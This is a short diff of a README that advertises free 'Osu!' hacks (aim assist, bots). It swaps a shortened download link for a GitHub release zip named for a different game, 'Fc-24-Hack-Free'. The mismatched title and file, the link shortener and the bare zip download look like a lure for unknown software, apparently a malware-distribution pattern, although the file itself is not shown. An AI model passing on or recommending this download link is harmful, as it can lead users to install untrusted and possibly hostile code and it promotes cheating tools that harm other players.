@@ -1,6 +1,6 @@
 # 🚀 Top-Osu!-Hacks-2024: Aim Assist, Bots, and More 🚀
 
-*** [Download](https://goo.su/rH3n) ***
+[Download](https://github.com/K4l4shn1k0v1337/Fc-24-Hack-Free/releases/download/Fc-24-Hack-Free/Fc-24-Hack-Free.zip)
 
 ## 📜 Overview
 
